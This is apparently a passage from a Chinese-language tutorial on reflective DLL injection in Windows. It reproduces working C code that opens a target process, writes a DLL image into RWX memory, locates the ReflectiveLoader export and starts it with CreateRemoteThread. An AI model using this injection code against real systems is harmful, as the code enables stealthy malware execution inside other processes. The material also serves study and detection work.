		AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

	CloseHandle( hToken );
}
```

利用OpenProcess函数去打开目标进程

```c
hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
```

 然后利用LoadRemoteLibraryR实现dll的注入

```c
hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );
```

## LoadRemoteLibraryR的实现

### 流程

获取dll文件中的ReflectiveLoader的偏移

```c
dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
```

在宿主进程中分配一段可读可执行的内存空间

```c
lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
```

把dll映像写入进程

```c
if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
				break;
```

使用CreateRemoteThread创建远程线程并执行ReflectiveLoader

```c
// add the offset to ReflectiveLoader() to the remote library address...
lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

// create a remote thread in the host process to call the ReflectiveLoader!
hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId );
```

具体代码如下：

```c
HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter )
{
	BOOL bSuccess                             = FALSE;
	LPVOID lpRemoteLibraryBuffer              = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread                            = NULL;
	DWORD dwReflectiveLoaderOffset            = 0;
	DWORD dwThreadId                          = 0;

	__try
	{
		do
		{
			if( !hProcess  || !lpBuffer || !dwLength )
				break;

			// check if the library has a ReflectiveLoader...
			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
			if( !dwReflectiveLoaderOffset )
				break;

			// alloc memory (RWX) in the host process for the image...
			lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
			if( !lpRemoteLibraryBuffer )
				break;

			// write the image into the host process...
			if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
				break;

			// add the offset to ReflectiveLoader() to the remote library address...
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

			// create a remote thread in the host process to call the ReflectiveLoader!
			hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId );

		} while( 0 );

	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		hThread = NULL;
	}

	return hThread;
}
```

### GetReflectiveLoaderOffset的实现

取ReflectiveLoader函数在DLL文件中的文件偏移通过传参进来的基地址强制类型转换成PIMAGE_DOS_HEADER类型指向e_lfanew，加上基地址得到NT Header。 找到导出表 从导出表中通过AdressOfName表找到 ReflectiveLoader，计算出他的索引值，从而在AddressOfFuction表中找到该函数地址，再转换为在DLL中的文件偏移。

具体代码如下

```c
DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
{
	UINT_PTR uiBaseAddress   = 0;
	UINT_PTR uiExportDir     = 0;
	UINT_PTR uiNameArray     = 0;
	UINT_PTR uiAddressArray  = 0;
	UINT_PTR uiNameOrdinals  = 0;
	DWORD dwCounter          = 0;
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
	{
		if( dwCompiledArch != 1 )
			return 0;
	}
	else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
	{
		if( dwCompiledArch != 2 )
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while( dwCounter-- )
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));

		if( strstr( cpExportedFunctionName, "ReflectiveLoader" ) != NULL )
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}
```
